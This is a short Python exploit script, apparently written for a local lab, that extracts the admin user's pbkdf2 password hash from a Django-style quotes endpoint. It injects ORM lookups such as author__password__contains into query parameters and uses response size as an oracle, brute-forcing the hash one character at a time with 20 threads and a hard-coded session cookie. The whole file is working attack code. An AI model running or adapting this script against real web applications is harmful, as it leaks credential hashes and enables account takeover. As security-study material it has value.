import requests
import string
import sys
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode

TARGET = "http://127.0.0.1:8000/quotes/"
CHARS = string.ascii_letters + string.digits + "$/=+_"
THREADS = 20

session = requests.Session()

session.cookies.update({
    'sessionid': '94re7bwbv9ygdmx9zp7mxwjpxdsogfaf'
})

def worker(username: str, known_dumped: str, c: str) -> tuple[bool, str]:
    query_params = {
        "author__username": username,
        "author__password__contains": known_dumped + c
    }
    
    query_string = urlencode(query_params)

    r = session.get(f"{TARGET}?{query_string}")
    
    response_size = len(r.content) 

    return response_size > 3120, known_dumped + c

def exploit(username: str):
    dumped_value = "pbkdf2_sha256$"
    print(f"\r{Fore.GREEN}username: {Fore.BLUE}{Style.BRIGHT}{username}{Style.RESET_ALL}")
    print(f"\r{Fore.RED}password: {Fore.YELLOW}{Style.BRIGHT}{dumped_value}{Style.RESET_ALL}", end="")
    sys.stdout.flush()

    while True:
        found = False
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = executor.map(worker, [username] * len(CHARS), [dumped_value] * len(CHARS), CHARS)

            for result in futures:
                was_success = result[0]
                test_substring = result[1]

                print(f"\r{Fore.RED}password: {Fore.YELLOW}{Style.BRIGHT}{test_substring}{Style.RESET_ALL}", end="")
                sys.stdout.flush()

                if was_success:
                    found = True
                    dumped_value = test_substring
                    break

        if not found:
            break
    
    print(f"\r{Fore.RED}password: {Fore.YELLOW}{Style.BRIGHT}{dumped_value} {Style.RESET_ALL}")

def main():
    exploit("admin")

if __name__ == "__main__":
    main()
